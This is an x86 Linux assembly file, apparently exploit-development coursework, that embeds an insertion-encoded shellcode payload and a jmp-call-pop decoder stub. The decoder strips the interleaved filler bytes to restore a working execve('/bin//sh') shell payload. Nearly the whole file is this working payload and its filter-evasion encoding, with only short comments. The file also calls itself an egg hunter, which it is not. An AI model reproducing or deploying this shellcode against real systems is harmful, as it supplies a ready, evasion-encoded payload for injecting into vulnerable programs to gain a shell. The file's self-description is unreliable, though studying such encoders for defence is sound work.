;; egg_hunter.asm
; Author: Mutti K
; Purpose: Demonstration of insert encoded shellcode.

global _start

section .text
_start:
    ;First step is to jmp to location of encoded shellcode to help get address of position
    jmp short encoded_shell_marker

decoder:
	pop esi ; Address of last caller, which is where the encoded shellcode is.
	xor ecx,ecx
	mov cl, byte[esi]; encoded shellcode has prefix for loop counter
	inc esi ; move esi past prefix counter to start of shellcode
	lea edi, [esi +1] ; location of next byte (the inserted 0xaa)
	xor eax, eax
	mov al, 1
	xor ebx, ebx
    
decode: 
	mov bl, byte [esi + eax + 1] ; Move value after insertion byte 
	mov byte [edi], bl ; Overite insertion byte
	inc edi ; Increment insertion  counter 
	add al, 2
	loop decode
 	jmp short EncodedShellcode +1 ; Loop finished so continue from 1 byte past prefix to shellcode
   
encoded_shell_marker:
    call decoder
	EncodedShellcode: db 0x17,0x31,0xf1,0xc0,0x5f,0x89,0x16,0xc2,0x9a,0x89,0xa9,0xc1,0x3d,0x50,0xed,0x68,0x45,0x2f,0x90,0x2f,0x14,0x73,0xcc,0x68,0xc0,0x68,0x7b,0x2f,0x91,0x62,0xe3,0x69,0xd7,0x6e,0x06,0x89,0x7d,0xe3,0xda,0xb0,0x6e,0x0b,0x14,0xcd,0x80,0x80,0x4e
